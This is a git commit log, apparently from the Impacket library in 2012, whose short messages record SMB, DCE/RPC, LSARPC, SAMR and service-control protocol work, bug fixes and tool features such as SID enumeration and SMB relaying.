commit 7d526a6140f299897359bb5583f121477d6021a8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun May 20 23:12:24 2012 +0000

    1) Adding SPOOLSS UUID
    2) EnumPrinters now returns data

commit 73a44c7e5c5c25a82fd569790667042398d600ff
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun May 13 17:39:57 2012 +0000

    We're not updating the Changelog anymore.. google code can do that :)

commit 6c3c1cbf475b3ad5ca64fa69243b304d869f0172
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun May 13 17:32:45 2012 +0000

    update

commit 060964bc775b7279d3d8b1b582329de84075c06e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun May 13 17:05:16 2012 +0000

    1) Added support for shell commands thru '!'
    2) Share's list first done through SRVSVC, if it fails, falls back to LANMAN

commit 3422aaa3e82c71c31d28e11ec1293d5a80026a39
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun May 13 01:53:42 2012 +0000

    Small fix on negTokenResp when parsing negResults with no extra data

commit 97f0b6d1b777a2d6c8322afdb7f70e032096b2b9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun May 13 01:51:25 2012 +0000

    SPNEGO test case. We should add more tests in here

commit 2a9ab2071c5f7551f175e8fb35b2f917f2694182
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat May 12 18:58:59 2012 +0000

    Adapting smbrelayx to svcctl exception handling previously committed

commit c578f9fc2dd64122dce69b66b831528112078a29
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat May 12 18:31:15 2012 +0000

    Added the ability to use external srvsvc dcerpc server. Disabled by default. Uncomment lines in simple_server.py to test it.

commit 7165090b7860d4e0201e4a2364d1eb7d8799e8a0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat May 12 18:29:18 2012 +0000

    A minimalist DCE RPC Server, just for the purpose (for now)
    of making smbserver to work better with Windows 7, when being asked
    for shares

commit bdb995f37fb25866479a3b09c2241d37f4fdc21f
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu May 10 02:00:56 2012 +0000

    In the context of issue 7 reported by oss@divinehawk.com, we fixed TCP parser to avoid get stuck while parsing TCP options.
    Also we added a testcase to support this case.

commit cd7c71fa7bab0c374e2248ffce77b3fb6cf59c33
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed May 9 23:17:25 2012 +0000

    If CAP_LARGE_WRITE or CAP_LARGE_READ are enabled and the communication is not signed, we increase the buffers for read and write to speed up performance.

commit 26e70b4cd86b64e7eea35a3f313148b2ba556980
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 7 18:53:28 2012 +0000

    Ability to resume an enumusers call if many entries are returned

commit 19482fe37e4a7d931846c284b612829557750b1b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 7 18:37:57 2012 +0000

    Changing permissions when opening target LsaR

commit 134a29978dde25e959599f054c1c0becc0ded477
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 7 18:26:07 2012 +0000

    Where there are many users in the target machine, there should be a way to continue the search. Added that possibility to the enumusers() method.

commit 19ddf71ec1f88fafc02eacf7b14f9f113f603cb3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 7 13:21:28 2012 +0000

    RefId random value CANNOT include 0

commit c06870d0a8739e08338c63be0642cf3dc829bccd
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 7 13:21:02 2012 +0000

    1) Fixed padding issue in DOMAIN_INFORMATION
    2) doRequest now checks whenever the DCE call triggered an error by default (some functions explicitly set is to False)
    3) RefId random value CANNOT include 0

commit b49cf12f72f8ae1efe9eb62ae2fd8ac142362313
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 7 04:06:37 2012 +0000

    Now it does bruteforce. MaxRid parameter sent thru command line.

commit 877c89e7a436c84d98cf1315e85091bd718d0bfb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 7 04:03:09 2012 +0000

    1) alignment in LsaLookupSid struct not needed
    2) Better handling for LSARPCLookupSidsResponse.formatDict() when some of the answers are NULL pointers (e.g. some SIDs NOT_MAPPED).
    
    That whole LSARPCLookupSidsResponse.formatDict() should be rewritten.. I don't like the way it was implemented.

commit 4549684a78288bbb9cbd968ae3de7b801f5a1180
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 7 00:36:42 2012 +0000

    First implementation of lookupsid brute forcing.. still not bruteforcing a thing ;)..

commit 8d926970b6e7ead17dce9abebb7387895c16ef38
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 7 00:35:02 2012 +0000

    1) Added LSARPCSessionError Exception, still left to print the NT Status code
    2) Added LsarQueryInformationPolicy2 call

commit 646a668790e44aada75a810f1db22d28f7efdee3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 1 23:20:26 2012 +0000

    UUIDs for each endpoint now in readable form

commit b12247b9147c2ae92e1fb8c248ea52fb4afff5f7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 1 23:11:16 2012 +0000

    Avoid opening a dummy servicename when asking for LIST action

commit a481520586f586184a08b898be6d5d2f2b299415
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Apr 29 21:39:46 2012 +0000

    Setting svn:keywords "Id" on all files

commit dfbfabf0c55227790eaf04e9f2b6fb8d3b51e10e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Apr 29 21:30:27 2012 +0000

    Copyright update

commit 4538240fcce1e32e878147f30296efabd5e3d7a0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Apr 29 21:04:38 2012 +0000

    Copyright updates

commit 086817b3fc0aa8ac1180a4b17acbf0168eeab403
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Apr 29 20:41:05 2012 +0000

    1) Added capability to get the SID Type when parsing lookupSid response (thanks lanjelot!)
    2) Fixed a padding issue when parsing the odd domainnames

commit abe7b092e7182a62a2be0e69bc0c92c5893705bf
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 17 13:07:49 2012 +0000

    doRequest now throws an SVCCTLSessionError Exception when the RPC call fails, dumping the right error.
    This means all the exposed function will throw an Exception when an error is found.

commit 78c8f005522e9ba8d2a979f997292e6dbdcecae0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Mar 12 21:51:26 2012 +0000

    Removed debug message

commit 1552df235136b657d10c939b1830b5f35e5076a7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Mar 12 20:55:38 2012 +0000

    Fixed wrong detection of an existing smb_server, resulting in disconnecting it when disconnect() was called

commit 1fdd49d8566542cc5b199bf25992a6df1f56082f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 9 19:46:31 2012 +0000

    Adding the ability to set up transport's connection timeouts programmatically

commit 8d0deabb2600b9d4eaa1b62ae1616377c09abd4f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 9 19:15:10 2012 +0000

    Fixed previous smb.py commit bug in set_flags()

commit 5f75480b08545c2fe81b57e6949a4d4cb44f7c7e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 9 19:03:32 2012 +0000

    Fixes bug introduced in previous version triggered when targeting port 139

commit 8ac46fec6b5c302430bcee8ac1f1a7a69915d57d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 9 16:41:09 2012 +0000

    Added set_flags() and and get_flags() methods for the SMB class

commit 9d27274a2ad0f8395bb04c055b23119339e558b8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Mar 8 21:48:29 2012 +0000

    Merge from Impact Engineering team changes to Impacket

commit 9f31cc6e39782887f0207337f1b67a67f2b9ae10
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Mar 8 15:08:20 2012 +0000

    select_poll can be configured from SMBSERVERHandler()

commit a40db80c8cf1aa89d1578b02b151cc2b2ba19523
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Mar 8 11:56:29 2012 +0000

    Simpler way to switch between select_poll mode and normal mode, in the __read function. Applying patch from Martin.

commit 0f8c83b083f4ce7a3641f543fd75144ed0842245
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Mar 8 11:44:42 2012 +0000

    Fixed bug when handling old MSRPCHeader packets.. Now it should work with both versions

commit 1034ff6dea7744f2f8862bb66efa286647b589b3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Mar 5 18:51:07 2012 +0000

    Fixed '=' for '=='.. dumb me :p

commit 5ab9271061e922f03ee27211ee62c17ce14facdb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Mar 5 16:20:54 2012 +0000

    Added select_poll option, another way to make select of a socket

commit ee77f56d253bc9f2ab75858a368aec60b0195398
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Mar 3 03:19:35 2012 +0000

    Added SMB_FIND_FILE_ID_BOTH_DIRECTORY_INFO and SMB_FIND_FILE_ID_FULL_DIRECTORY_INFO information level support for findfirst2

commit 5ed088613abbe491818bc8b468b7f522afd3733b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Mar 3 01:51:57 2012 +0000

    Removed debug message and converted received share to uppercase

commit 1fed9fa238e5d148c815b363ec3bd9496deccc54
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Mar 3 01:30:43 2012 +0000

    Added LanMan NetShareGetInfo call

commit 831c73f10758dad019cf0d518086cf1e936832d0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 2 22:10:54 2012 +0000

    Added support for extended reponses when client does a treeconnectandx

commit e78e84e44c39526a1a4791fc7bbb2cb637ad2209
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 2 22:09:43 2012 +0000

    Added SMBTreeConnectAndXExtendedResponse_Parameters structure

commit 5362f5f1ed0c42c529aec4d8d4773465fe23b383
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 2 20:47:21 2012 +0000

    Added SMBNtCreateAndXExtendedResponse_Parameters structure

commit 6734830b7ec96f024464c42431e991f92ed5a171
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 2 15:31:47 2012 +0000

    Added SRVSVCServerInfo101 and SRVSVCServerpInfo101 structures

commit 0ebf3d59f2f522ad9e7044ec79d3e69c4f239fa4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 2 14:04:17 2012 +0000

    Added support for LANMAN SMBNetServerGetInfo

commit 9046ab3d1548abb8cea24c8b8e2202d7d0630a2f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 2 14:03:26 2012 +0000

    Added SMBNetServerGetInfoResponse and SMBNetServerInfo1 structures

commit 9918b7b8fcbcbfaed493cf778fecf37b9bce11be
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 2 03:21:04 2012 +0000

    Minor changes on SRVSVCShareEnumStruct and SRVSVCNetrShareEnum1_answer setting some default values

commit f729ccdb964777e9ddf783e2b68356cbeb2fa4c3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 2 02:53:15 2012 +0000

    Small change to SRVSVCNetrShareEnum structure so it gets easier to parse an
    incoming request

commit 5fe0da82664d4b691c0bb23d8b1a00d0a7392b34
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Mar 1 22:01:53 2012 +0000

    Small change to SRVSVCNetrShareEnum structure so it gets easier to parse an incoming request

commit 0d23860f1c95abdf58014d587407c955a590261e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Mar 1 15:02:47 2012 +0000

    registerNamedPipe() receives an address instead of a socket. Socket is created/connected once a NTCreateAndX request is received.

commit 2643fab7d0c54ffe4d63b6d0f865f0a00130a11e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Mar 1 14:15:27 2012 +0000

    Added transactNamedPipe() to smbserver

commit 979bc8c47b009ae9bc51ad4da461755c98608dc4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Mar 1 14:11:35 2012 +0000

    Setting some default values for structures

commit 66868d46aec642b7744873a76f57b6bc8f1c4f4e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Feb 29 17:49:25 2012 +0000

    1) Updated NT Error Messages strings.
    2) Changed SessionError Exception message format
    3) Changed SmbPacket (old version) structure to it also grabs the reserved field that is part of the NT Error Code

commit 1e5ee07ea0e380cb1bda83c0c13251551c0bbfdb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Feb 28 23:18:03 2012 +0000

    Implemented registerNamedPipe() allowing to register NamedPipes (e.g. srvsvc) to a socket. Currently implemented in smbComRead/Andx, smbComWrite/Andx and NTCreateAndX (still pending transactions). Every read/write request will be sent to the registered socket, allowing to have a third party RPC Server answering those requests.

commit 88874e6765f8daba569247f83020e4309721bf74
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Feb 28 13:03:35 2012 +0000

    Fixed bug where lm/nt hashes were cleared before sending the for authentication, actually breaking it. Thanks Bernardo for reporting this!

commit 19e479923c82f2f1e7a71180ccbc79f6af816a94
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 27 22:07:41 2012 +0000

    Fixes Issue: http://code.google.com/p/impacket/issues/detail?id=9
    
    Thanks to thebigguy.co.uk

commit b69f4d483e58d633142f33a2271c6576b6980417
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 27 20:59:10 2012 +0000

    Support for argument passing for StartServiceW(). Testing still needed

commit 7082864e8b863a16c005106915803d1cda36621f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 24 20:48:46 2012 +0000

    Added downgrade exception if Samba is also detected. If not some of those OSes, then raise the exception

commit 72e3e163603147323c7ab0e34a5ca5fddc8f835c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 24 20:39:08 2012 +0000

    Added doesSupportNTLMv2(). Now just downgrading to NTLMv1 whenever we find a target Windows 2000 (I gotta test Samba)

commit ef28649f3567ae74939da603a3987771ff3924b8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 24 20:38:00 2012 +0000

    When authenticating, now asks the higher transport about whether or not to use NTLMv2 (through self._transport.doesSupportNTLMv2()). This is the best effort we can do against old Windows systems (and probably Samba)

commit c69fe6587ac7de25ac63ee2dc08750ba47e6e91d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 24 20:35:32 2012 +0000

    Adding doesSupportNTLMv2() method so underlying RPC instances can ask for it when authenticating. Right now it would work only for SMB Transports since there is the only place we can figure out this setting.

commit 7a2c8c494691a6f3f089ff7780001a0c0f4f1d4b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 24 20:34:26 2012 +0000

    Using NTLMv2/V1 can now be set programmatically

commit 4a5b87d308d5e7c19e434cf94ccefbc2d7a4970b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 24 18:21:21 2012 +0000

    Using NTLMv2/V1 can now be set programmatically

commit 968b81c5c0b323a699ddd59f4228c4d5b4e201c5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 24 18:10:02 2012 +0000

    A few NT error codes added

commit e7d01b5b59b9dc8508afb21d97eebfbaaaa78253
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 24 18:09:43 2012 +0000

    Using NTLMv2/V1 can now be set programmatically

commit 4b7633fbb9b7242a883f37beeb29175c6b6c60f3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Feb 23 21:24:33 2012 +0000

    If the server received a NetBios Session Request, it will answer with a NETBIOS_SESSION_POSITIVE_RESPONSE, meaning now this could be use in port 139 as well.

commit c7f4fdbfca6ea22398e6fffa743177de128afe95
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Feb 23 15:13:44 2012 +0000

    Initial lsarpc implementation by Pablo

commit bf0225f6ef9d472481b7a39558b9aaac7c467a4f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 17 16:50:00 2012 +0000

    More custom settings if run on a win32 platform

commit 73ad20bb4ff2026866ee4237a9a79d89a2c21188
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 17 15:59:41 2012 +0000

    FIND_NEXT was missing a trailing NULL byte in the filename

commit 8abbe4b2ddd61263f758b67fbb67bd9879efbb72
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Feb 16 20:37:47 2012 +0000

    Tweaked some methods to handle being used from a win32 platform

commit 87a412f8693da7662ed54a90ed2ff198d9480d17
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Feb 16 19:43:40 2012 +0000

    Ability to specify and already crafted configParser

commit e7a2b6afe0cd794ce8fa38103fe053b38b9005b4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Feb 16 15:02:22 2012 +0000

    If destination port SMB_SESSION_PORT and remote name *SMBSERVER, we're changing it to its IP address

commit 9df080feb015120c6b113bb18a28740ce81863c7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Feb 15 21:48:05 2012 +0000

    If destination port != 139, don't use *SMBSERVER 'cause it will ask for the target netbios name, and that takes time when it's not really needed.

commit 65ea16a332a38574d4abfa82fc63e35765aad5ac
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Feb 15 21:37:33 2012 +0000

    1) Added pipe disconnected NT error
    2) Fixed bug in TransactNamedPipe() when parsing the answer

commit 5e020bb6da9ce2891d29e41167420552bd4e6005
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Feb 14 22:31:40 2012 +0000

    Fixed an error in StartServiceW() introduced in r455. Falling back to the original structure. Still doesn't parse commands, that's pending.

commit 60b871c3f573a92835f22a15e5d1cd56e9417333
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 13 22:04:26 2012 +0000

    GetMembersInAlias() now working.. needs some testing.. Interesting data in the answer['EnumerationBuffer'].

commit a91cc8b42a46aa749348fe5978963c9a17963311
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 13 20:10:03 2012 +0000

    fromCanonical method added to SAMR_RPC_SID() to simplify SIDs manipulation.
    
    e.g:
    
    sid = samr.SAMR_RPC_SID()
    sid.fromCanonical('S-1-5-4')
    str(sid)

commit 96521603a1ec1b616f76718f1641cb56437e5e82
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 13 19:22:55 2012 +0000

    Added:
    1) OpenAlias
    2) GetMembersInAlias
    3) SID Parsing and canonical printing
    
    Still need to be tested

commit dd7bb98ca08c8f1c4e776c8008d50fa50dbdd3e7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 13 13:55:02 2012 +0000

    Quick and dirty fix so it now supports bash like history (using cmd.Cmd)

commit 2965bb784992e62640b4304a6a113d5e8fb4ec6d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 10 22:34:23 2012 +0000

    Support for multiple answers for NetrWkstaTransportEnum()

commit 404d6b3d4b34c6992a0e108ace824a62ef65c079
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 10 22:33:32 2012 +0000

    Support for more than 1 item in the answer array (sometimes it happens, especially with w2k machines)

commit 33fbce54e6733ec28e055b6d25d95765696e8df2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 10 21:56:15 2012 +0000

    Forcing smbclient to use tree_connect_andx

commit 69d95c5a927354e50f6c04c3c61144162205d8c3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 10 21:34:54 2012 +0000

    Small script to test wkssvc.py

commit e7f4988c49c327b917207766aef9f065571410c0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 10 21:22:19 2012 +0000

    First implementation of Workstation Service. Implemented NetrWkstaTransportEnum() for retrieving target systems MAC address and Interface Information

commit e023c89b103c60f181e241c147df2929bed1bbcd
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 10 17:31:30 2012 +0000

    Added EnumerateAliasesInDomain(). For now it returns a list of dcerpc.MSRPCArray
    
    We should port those NDR funtions to structure in the future

commit 836c36aa5a7aa3b5e68cea630411ab18bcd931e8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 10 16:06:14 2012 +0000

    adding a self.rawData variable that hold the original buffer sent to Structure, so it can be used inside the structs to calculate lengths.

commit 48f5eb3cbc5031fe9947cbbed4f152119d8c1f64
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 26 15:19:46 2012 +0000

    Not retrieving the Strings if the call returned an error. It's caller's reponsibility to check that result as well whenever printing the data returned.

commit 44e06db64aa1881c2228a5a8be69d950c3a8ac20
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 26 13:22:26 2012 +0000

    Sometime the difference between bytesNeeded and the actual packet is less than 6, it's safer to go just for len(ans)

commit b594ba55562acb7fed3ad49ac4a147fef5ceb62a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 24 18:38:42 2012 +0000

    CONFIG option finished

commit a18479949db001252395a4232f7da0991c462a96
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 24 18:38:14 2012 +0000

    Added QueryServiceConfigW(), should work now.. testing needed.

commit e4638262d85e3e2f0e5a23811e08a68f4010c876
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 23 00:47:43 2012 +0000

    Added CONFIG option. Not yet functional, just used for triggering and debugging QueryServiceConfigW()

commit a1b9eccec6d5dbd21a7e6e8d65b35f3efd040044
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 23 00:30:26 2012 +0000

    More on QueryServiceConfigW().. still a lot of work to do.

commit 066d2fea0b9e9564e4f4da84547b81c6a9430b12
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jan 22 23:18:51 2012 +0000

    Initial version of QueryServiceConfigW.. It parses well the response data, except the QUERY_SERVICE_CONFIGW structure. Not yet ready for use

commit 09f522823ffa381764334b7ee3ccfd0a1d1e267a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jan 21 22:29:08 2012 +0000

    1) Added SVCCTLRQueryServiceStatus and QueryServiceStatus from Bernardo patches
    2) Fixed wrong StartServiceW opnum number from Bernardo patches
    3) Some work pending on StartServiceW handling arguments

commit fd639af8ce97f7ae56a4098db0c67c857a5116b2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jan 21 22:21:43 2012 +0000

    Added STATUS option

commit fe6d3957a0a159b099a29dfea151f5f3a3cfb418
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jan 21 22:11:40 2012 +0000

    Ok... more on EnumServices:
    1) StringsOffset does not belong to SVCCTLServiceStatus
    2) BytesNeeded was in the wrong position within SVCCTLREnumServicesStatusWResponse
    3) The returned buffer contains TWO pointers to the strings DisplayName and ServiceName

commit 8ade7964491f46abb6f27ec5483bb7e3db73300b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 20 20:07:33 2012 +0000

    Fixed bug in EnumServicesStatusW().. Figure out previous DontKnow field is actually the offset within the packet where the service's string is hold.

commit d36ea1de33324039c1e01d3a7f054776131f2ee5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 20 18:37:20 2012 +0000

    Merging Bernardo fix for services.py

commit 54668a8ba512a8c7baada71cf51c0b0409eed50d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 20 18:33:25 2012 +0000

    Merging fixes by Bernardo... StopService() now returns SVCCTLServiceStatus.

commit 610d0d200e1fd092e19c72d01cc7c5c17a341cf7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 19 22:28:06 2012 +0000

    1. DCE Fragmentation reassembly added to recv()
    2. Added checks to ask the upper layer for more bytes in case we haven't received a full RPC Packet (especially important for TCP/UDP transports)

commit ad4cb4896a7bfb72695336c268ef340ce6bcfe9b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 19 22:26:32 2012 +0000

    Added the ability to LIST services... just specify a random servicename...

commit 68e30891ebc28a92375b183ac5d11d3e94142121
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 19 21:34:23 2012 +0000

